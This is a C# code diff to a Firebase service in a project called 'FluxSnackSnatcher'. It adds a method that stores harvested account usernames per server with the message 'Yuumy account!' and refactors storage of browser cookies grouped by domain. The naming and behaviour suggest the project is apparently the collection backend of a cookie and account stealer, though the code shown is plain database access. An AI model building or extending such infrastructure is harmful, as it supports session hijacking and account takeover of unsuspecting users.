@@ -7,10 +7,30 @@ namespace FluxSnackSnatcher.Services
     public class FirebaseService : IFirebaseService
     {
         private readonly FirebaseClient _firebaseClient;
+        private const string COOKIES_PATH = "cookies";
+        private const string ACCOUNTS_PATH = "accounts";
 
         public FirebaseService(FirebaseClient firebaseClient)
         {
             _firebaseClient = firebaseClient;
+        }
+
+        public async Task<string> SetAccount(AccountData account)
+        {
+            try
+            {
+                await _firebaseClient
+                    .Child(ACCOUNTS_PATH)
+                    .Child(account.Server)
+                    .Child(account.Username)
+                    .PutAsync(account);
+
+                return $"Yuumy account! {account.Username} @ {account.Server}";
+            }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
         }
 
         public async Task<string> SetCookie(CookieData cookie)
@@ -20,7 +40,7 @@ namespace FluxSnackSnatcher.Services
                 var childElement = ExtractDomainSegment(cookie.ServerUrl);
 
                 var cookies = await _firebaseClient
-                    .Child("cookies")
+                    .Child(COOKIES_PATH)
                     .OnceAsync<IList<CookieData>>();
 
                 var list = cookies.FirstOrDefault(c => c.Key.Equals(childElement))?.Object ?? new List<CookieData>();
@@ -28,7 +48,7 @@ namespace FluxSnackSnatcher.Services
                 list.Add(cookie);
 
                 await _firebaseClient
-                    .Child("cookies")
+                    .Child(COOKIES_PATH)
                     .Child(childElement)
                     .PutAsync(list);
 
@@ -40,13 +60,12 @@ namespace FluxSnackSnatcher.Services
             }
         }
 
-
         public async Task<IDictionary<string, IList<CookieData>>> GetCookies()
         {
             try
             {
                 var firebaseResult = await _firebaseClient
-                    .Child("cookies")
+                    .Child(COOKIES_PATH)
                     .OnceAsync<IList<CookieData>>();
 
                 var cookiesDictionary = firebaseResult
